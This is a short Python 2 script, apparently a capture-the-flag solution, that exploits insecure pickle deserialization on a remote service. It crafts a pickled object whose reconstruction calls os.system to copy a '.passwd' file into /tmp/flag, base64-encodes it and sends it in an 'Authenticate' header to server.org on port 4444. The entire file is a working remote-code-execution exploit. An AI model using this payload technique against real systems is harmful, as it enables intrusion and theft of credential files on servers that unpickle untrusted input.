from socket import *
import sys
import time
import pickle, new
import os, urllib
from base64 import *

def exploit(module, function, *args):
    return pickle.dumps(new.classobj(function, (), {'__getinitargs__': lambda self, arg = args: arg,'__module__': module}) ())

HOST = 'server.org'
PORT = 4444

client = socket(AF_INET, SOCK_STREAM)
client.connect((HOST, PORT))

t = exploit("os", "system", "cat .passwd > /tmp/flag")
client.send("AUTH admin HTTP/1.0\nAuthenticate: "+t.encode("base64")+"\n\n")
print(client.recv(1024))
client.close()